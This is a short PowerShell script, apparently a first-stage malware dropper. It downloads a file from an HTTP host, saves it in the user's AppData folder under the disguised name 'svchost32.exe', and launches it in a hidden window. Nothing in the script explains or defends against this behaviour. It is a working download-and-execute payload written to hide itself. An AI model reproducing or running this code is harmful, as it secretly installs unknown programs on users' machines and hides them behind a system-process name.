[CmdletBinding()]
param(
    [string]$Stage1Url = "http://internal.corp:8080/assets/update.dat",
    [string]$DropPath = "$env:APPDATA\svchost32.exe"
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $DropPath)
Start-Process -FilePath $DropPath -WindowStyle Hidden
Write-Verbose "stage marker 40 reached"
